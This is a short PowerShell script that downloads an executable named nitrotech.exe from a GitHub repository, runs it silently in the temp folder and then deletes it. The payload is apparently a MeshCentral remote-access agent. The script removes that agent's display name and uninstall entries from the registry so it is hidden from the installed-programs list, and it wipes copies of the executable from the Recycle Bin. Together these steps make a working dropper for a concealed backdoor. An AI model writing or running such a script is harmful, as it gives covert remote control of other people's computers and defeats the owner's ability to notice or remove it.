[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$URLs = @(
    'https://github.com/InfernoTV/Plagiat/raw/refs/heads/main/nitrotech.exe'
)
$exePath = "$env:TEMP\nitrotech.exe"
foreach ($URL in $URLs | Sort-Object { Get-Random }) {
    try {
        Invoke-WebRequest -Uri $URL -OutFile $exePath -UseBasicParsing
        break
    } catch {}
}
if (-not (Test-Path $exePath)) {
    throw
}
Start-Process -FilePath $exePath -ArgumentList "-fullinstall" -Wait
Remove-Item $exePath -Force
$uninstallKeys = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mesh Agent',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\MeshCentralAgent'
)
foreach ($uninstallKey in $uninstallKeys) {
    if (Test-Path $uninstallKey) {
        Remove-ItemProperty -Path $uninstallKey -Name 'DisplayName' -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $uninstallKey -Name 'UninstallString' -ErrorAction SilentlyContinue
    }
}
$recycleBinPath = [System.IO.Path]::Combine($env:SystemDrive, '\$Recycle.Bin')
$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'nitrotech.exe' -ErrorAction SilentlyContinue
foreach ($file in $filesInBin) {
    Remove-Item -Path $file.FullName -Force
}
